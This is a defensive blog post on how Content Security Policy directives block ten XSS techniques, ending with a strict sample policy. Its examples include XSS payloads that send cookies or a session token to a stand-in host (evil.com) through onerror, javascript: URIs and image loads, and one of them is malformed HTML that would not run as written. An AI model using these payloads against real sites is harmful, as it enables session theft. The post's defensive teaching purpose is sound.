---
title: "10 Browser Features XSS Weaponizes — And How CSP Disarms Every Single One"
tags:
  - security
  - CSP
  - XSS
  - web-security
  - browser-security
  - defense-in-depth
  - content-security-policy
  - exploit-prevention
---

**Challenge to the reader:** Open your browser's DevTools on any site you control. Paste the following into the Console: `document.querySelectorAll('script:not([nonce])').length`. That number is how many scripts would survive if you deployed a strict CSP tomorrow. Now subtract the ones loaded from third-party CDNs. The remainder is your migration surface — keep it in mind as you read.

---

Content Security Policy (CSP) is often misunderstood as a "bolt-on" header — something you add to your Nginx config and forget about. In reality, CSP is an **execution firewall** embedded in every modern browser. It doesn't just block `<script>alert(1)</script>` — it systematically disables **ten distinct browser features** that XSS attacks rely on, from inline event handlers to plugin objects to network exfiltration channels.

Understanding what CSP disables — and why each disabled feature matters — is the difference between a policy that looks good on paper and one that actually stops attacks. 

For the attacker's perspective on what happens when these protections are misconfigured, see the companion post: **[the bypass techniques catalog](/2026/07/12/csp-bypass-attacker-playbook.html)**.

---

## 1. Inline `<script>` Blocks

The oldest XSS vector in the book. Any injection point that accepts raw HTML — a comment field, a search box, a profile page — becomes a code execution primitive with `<script>alert(1)</script>`.

**How CSP disarms it:** The `script-src` directive, when it does NOT contain `'unsafe-inline'`, blocks every inline `<script>` block. Only scripts with a matching cryptographic nonce or hash execute:

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m';
```

```html
<!-- BLOCKED: no nonce -->
<script>alert(1)</script>

<!-- ALLOWED: carries the per-request nonce -->
<script nonce="r4nd0m">/* legitimate code */</script>
```

The nonce must be: (a) cryptographically random, (b) unique per request, and (c) never reused across responses. If any of these properties is violated, the bypass catalog shows exactly how attackers exploit it.

---

## 2. Inline Event Handler Attributes

`onclick`, `onerror`, `onload`, `onfocus` — HTML attributes that execute JavaScript directly in markup, no `<script>` tag required. A favorite in injection contexts where tag filters exist but attribute filters don't.

```html
<!-- Classic XSS without a single <script> tag -->
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

**How CSP disarms it:** CSP treats inline event handlers as inline scripts. Without `'unsafe-inline'` in `script-src`, the browser refuses to execute ANY `on*` attribute handler. The recommended replacement is `addEventListener()` in external (nonced) script files:

```javascript
// external.js, loaded with the correct nonce:
document.getElementById('x').addEventListener('click', handler);
```

This one rule alone kills a massive class of XSS payloads — and it requires zero code changes if your app already avoids inline handlers.

---

## 3. `javascript:` URIs

The `javascript:` protocol in `href` or `src` attributes executes code in the context of the current page:

```html
<a href="javascript:fetch('https://evil.com/?c='+document.cookie)">Click here</a>
```

These bypass script-tag-based filters entirely because they're not script tags at all — they're URLs.

**How CSP disarms it:** `javascript:` URIs are treated as inline script execution. A CSP without `'unsafe-inline'` in `script-src` blocks navigation to `javascript:` URIs, preventing their execution outright.

---

## 4. `eval()` and Dynamic Code Evaluation

`eval()` parses arbitrary strings as JavaScript. If an attacker controls any part of the string passed to `eval()`, they own the execution context. This is dangerous in applications that concatenate user input into eval'd strings:

```javascript
// Vulnerable: userInput flows into eval
eval("processOrder(" + userInput + ")");
```

**How CSP disarms it:** Unless `'unsafe-eval'` is explicitly present in `script-src`, the browser blocks all calls to `eval()`. This also covers indirect eval (`(0, eval)(...)`) and the `Function()` constructor. Replace eval-based JSON parsing with `JSON.parse()`:

```javascript
// Safe: no code evaluation, only data parsing
const data = JSON.parse(jsonString);
```

---

## 5. String Arguments to `setTimeout()` and `setInterval()`

Both accept string arguments that are implicitly `eval`'d:

```javascript
setTimeout("stealData(" + userControlled + ")", 100);
```

The browser treats this identically to `eval()` — parsing and executing the string as code in the global scope.

**How CSP disarms it:** String arguments to `setTimeout`/`setInterval` fall under the same `'unsafe-eval'` restriction. Without it, these calls are blocked. The fix is straightforward — pass function references instead:

```javascript
// Safe: function reference, not a string
setTimeout(() => stealData(param), 100);
```

---

## 6. `new Function()` Constructor

The `Function` constructor dynamically creates JavaScript functions from strings, functioning as a first-class alternative to `eval()`:

```javascript
new Function("userInput", "return alert(userInput)")("hello");
```

It's common in template engines, expression evaluators, and serialization/deserialization libraries — places where dynamic code generation seems justified but creates a code-injection surface.

**How CSP disarms it:** The `Function` constructor falls under `'unsafe-eval'`. A CSP without `'unsafe-eval'` blocks it entirely.

---

## 7. `<base>` Element Injection

A `<base>` tag, if injected early in a document, silently rewrites every relative URL on the page:

```html
<base href="https://evil.com/">
<!-- <script src="/js/app.js"> now loads from https://evil.com/js/app.js -->
<!-- <img src="/logo.png"> now loads from https://evil.com/logo.png -->
```

This is a **trusted-source pivot**: the attacker doesn't need to inject a script tag — they just need to redirect where existing, legitimate script tags load from.

**How CSP disarms it:** The `base-uri` directive restricts which URLs can be set via `<base>`. Set `base-uri 'self'` or `base-uri 'none'`. Critical: `base-uri` does NOT inherit from `default-src` — you must set it explicitly.

```
Content-Security-Policy: base-uri 'self';
```

---

## 8. External Plugin Objects (`<object>`, `<embed>`, `<applet>`)

Legacy plugin tags can execute native code (Flash, Java applets, ActiveX) or load HTML sub-documents via `data:` URIs:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

This bypasses `script-src` entirely — the browser loads a full HTML document inside the `<object>`, and that sub-document can contain scripts.

**How CSP disarms it:** The `object-src` directive restricts plugin content sources. `object-src 'none'` disables all plugin embedding, eliminating the entire attack surface:

```
Content-Security-Policy: object-src 'none';
```

There is almost no modern web application that legitimately needs `<object>` for plugins. Set it to `'none'` and move on.

---

## 9. Untrusted `<iframe>` Embedding

An injected `<iframe>` loads arbitrary content in a nested browsing context:

```html
<iframe src="https://evil.com/phishing-form.html"></iframe>
```

This enables clickjacking, credential phishing, and cross-origin data exfiltration via `postMessage`.

**How CSP disarms it:** Two directives. `frame-src` restricts which URLs can be loaded in iframes on YOUR page. `frame-ancestors` restricts who can embed YOUR page (defeating clickjacking):

```
Content-Security-Policy: frame-src 'self'; frame-ancestors 'none';
```

---

## 10. Unrestricted Network Exfiltration

Even when script execution is blocked, HTML injection alone can exfiltrate data:

```html
<!-- No script needed — the browser loads the URL automatically -->
<img src="https://evil.com/collect?token=" + sessionStorage.getItem('jwt')>
```

If script execution succeeds via a bypass, `fetch()`, `XMLHttpRequest`, `WebSocket`, and `navigator.sendBeacon()` provide rich exfiltration channels.

**How CSP disarms it:** `connect-src` restricts `fetch()`/XHR/WebSocket/EventSource/`sendBeacon()` destinations. `img-src` restricts where images load from — closing the classic pixel-tracking exfiltration vector:

```
Content-Security-Policy: connect-src 'self'; img-src 'self';
```

---

## 11. The Complete Policy: All 10 Features Disabled

A strict CSP that disarms all ten features:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-src 'none';
  frame-ancestors 'none';
  connect-src 'self';
  img-src 'self';
  style-src 'self';
  font-src 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri /csp-reports;
```

This policy:
- Blocks inline scripts, event handlers, and `javascript:` URIs (no `'unsafe-inline'`)
- Blocks `eval()`/`setTimeout` strings/`new Function()` (no `'unsafe-eval'`)
- Blocks `<base>` injection (`base-uri 'none'`)
- Blocks all plugins (`object-src 'none'`)
- Blocks frame injection (`frame-src 'none'`, `frame-ancestors 'none'`)
- Restricts network exfiltration (`connect-src 'self'`, `img-src 'self'`)

The `'strict-dynamic'` keyword allows scripts loaded by an already-trusted (nonced) script to execute their own dynamically-created children — this is the modern approach that replaces domain allow-lists, which are vulnerable to JSONP endpoint abuse and open-redirect chains.

**Challenge:** Take this strict policy, deploy it on your site in `Content-Security-Policy-Report-Only` mode, and collect violation reports for 24 hours. Every report is either (a) a real code path you need to fix, or (b) an attack attempt. Both are worth knowing about.

---

## 12. Why This Matters

CSP is not a "maybe later" feature. Each of the ten features above is an active attack surface in your application right now. The browser already ships the code to disable them — CSP just tells it *whether* to do so. When you ship a page without a CSP, you're telling the browser: "leave all ten attack surfaces open." The attacker's playbook exploits exactly that silence.

**Final challenge:** For every feature above, write down whether your current CSP (if any) disables it. Score yourself: 0 points for "enforced," 1 point for "report-only," 2 points for "not addressed." A score above 0 means you have work to do. This is not a theoretical exercise — the companion **[bypass techniques catalog](/2026/07/12/csp-bypass-attacker-playbook.html)** shows exactly what happens against every gap you just scored.

If you scored above 0, the **[practical mitigation guide](/2026/07/12/csp-lockdown-mitigation-guide.html)** walks through hardening each gap, step by step, with deployment strategy and CI/CD integration.

---

## References

- [Content Security Policy Level 3 — W3C](https://www.w3.org/TR/CSP3/)
- [CSP Evaluator — Google](https://csp-evaluator.withgoogle.com/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Mozilla MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
